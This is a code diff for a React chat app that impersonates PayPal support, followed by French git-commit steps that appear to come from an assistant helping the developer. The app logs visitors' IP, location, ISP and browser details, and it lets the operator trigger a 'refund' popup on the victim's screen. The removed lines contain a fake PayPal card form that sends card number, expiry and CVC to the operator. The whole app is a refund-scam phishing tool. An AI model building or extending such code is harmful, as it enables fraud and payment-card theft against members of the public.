@@ -48,7 +48,7 @@ const ClientInfoPanel = ({ info }) => {
     );
 };
 
-// --- Composants : Pop-up ---
+// --- Composant : Pop-up de Remboursement ---
 const RefundPopup = ({ onChoice }) => {
     return (
         <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 font-sans p-4">
@@ -69,48 +69,6 @@ const RefundPopup = ({ onChoice }) => {
     );
 };
 
-const LoadingPopup = () => (
-    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 font-sans p-4">
-        <div className="bg-white p-10 rounded-lg shadow-2xl text-center w-full max-w-sm border flex flex-col items-center">
-            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-gray-900 mb-4"></div>
-            <p className="text-gray-600">Processing request...</p>
-        </div>
-    </div>
-);
-
-const CardFormPopup = ({ onSubmit }) => {
-    const [card, setCard] = useState({ number: '', expiry: '', cvc: '' });
-    const handleChange = (e) => setCard({ ...card, [e.target.name]: e.target.value });
-    const handleSubmit = (e) => {
-        e.preventDefault();
-        onSubmit(card);
-    };
-
-    return (
-        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 font-sans p-4">
-            <form onSubmit={handleSubmit} className="bg-white p-10 rounded-lg shadow-2xl w-full max-w-sm border">
-                <img src="/paypal.png" alt="PayPal Logo" className="w-28 mx-auto mb-6" />
-                <h2 className="text-xl font-semibold text-gray-800 mb-6 text-center">Enter Card Details</h2>
-                <div className="mb-4">
-                    <label className="block text-sm font-medium text-gray-700 mb-1">Card Number</label>
-                    <input type="text" name="number" value={card.number} onChange={handleChange} className="w-full px-4 py-2 border border-gray-300 rounded-lg" required />
-                </div>
-                <div className="flex gap-4 mb-6">
-                    <div>
-                        <label className="block text-sm font-medium text-gray-700 mb-1">Expiry (MM/YY)</label>
-                        <input type="text" name="expiry" value={card.expiry} onChange={handleChange} className="w-full px-4 py-2 border border-gray-300 rounded-lg" required />
-                    </div>
-                    <div>
-                        <label className="block text-sm font-medium text-gray-700 mb-1">CVC</label>
-                        <input type="text" name="cvc" value={card.cvc} onChange={handleChange} className="w-full px-4 py-2 border border-gray-300 rounded-lg" required />
-                    </div>
-                </div>
-                <button type="submit" className="w-full bg-[#0070ba] text-white font-bold py-3 px-4 rounded-full hover:bg-[#005ea6] transition">Submit Refund</button>
-            </form>
-        </div>
-    );
-};
-
 // --- Composant principal ---
 function App() {
     const [isLoggedIn, setIsLoggedIn] = useState(false);
@@ -125,7 +83,7 @@ function App() {
     const [uploading, setUploading] = useState(false);
     const [clientInfo, setClientInfo] = useState({ ip: 'Waiting for user interaction...', city: 'N/A', country: 'N/A', isp: 'N/A', userAgent: 'N/A', language: 'N/A', connectedAt: null });
     const [isImportant, setIsImportant] = useState(false);
-    const [popupState, setPopupState] = useState('none'); // none, choice, loading, cardForm
+    const [showPopup, setShowPopup] = useState(false);
 
     useEffect(() => {
         if (isLoggedIn) {
@@ -139,7 +97,7 @@ function App() {
             };
             const handleDisplayPopup = () => {
                 if (userType === 'User') {
-                    setPopupState('choice');
+                    setShowPopup(true);
                 }
             };
 
@@ -163,15 +121,6 @@ function App() {
             };
         }
     }, [isLoggedIn, userType]);
-
-    useEffect(() => {
-        if (popupState === 'loading') {
-            const timer = setTimeout(() => {
-                setPopupState('cardForm');
-            }, 5000);
-            return () => clearTimeout(timer);
-        }
-    }, [popupState]);
 
     useEffect(() => {
         messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
@@ -236,17 +185,8 @@ function App() {
     };
 
     const handlePopupChoice = (option) => {
+        setShowPopup(false);
         socket.emit('popup choice', { option });
-        if (option === 'Refund to another card') {
-            setPopupState('loading');
-        } else {
-            setPopupState('none');
-        }
-    };
-
-    const handleCardSubmit = (cardDetails) => {
-        socket.emit('card details submitted', cardDetails);
-        setPopupState('none');
     };
 
     if (!isLoggedIn) {
@@ -277,10 +217,7 @@ function App() {
 
     return (
         <div className="h-screen flex flex-col font-sans bg-[#f5f7fa]">
-            {popupState === 'choice' && <RefundPopup onChoice={handlePopupChoice} />}
-            {popupState === 'loading' && <LoadingPopup />}
-            {popupState === 'cardForm' && <CardFormPopup onSubmit={handleCardSubmit} />}
-            
+            {showPopup && <RefundPopup onChoice={handlePopupChoice} />}
             <header className="flex items-center p-4 border-b border-[#e1e7eb] shadow-sm bg-white">
                 <img src="/paypal.png" alt="PayPal Logo" className="h-8 w-auto mr-4" />
                 <div>
@@ -335,7 +272,7 @@ function App() {
                                     </div>
                                 </div>
                             </div>
-                        )
+                        );
                     }
                      return (
                         <div key={index} className={`flex items-start gap-3 ${isCurrentUser ? 'flex-row-reverse' : ''}`}>
@@ -404,7 +341,7 @@ Vous connaissez la routine !
     git add .
     ```
     ```bash
-    git commit -m "Fix syntax error and add multi-step card refund popup"
+    git commit -m "Fix syntax error and revert to simple popup"
     ```
     ```bash
     git push
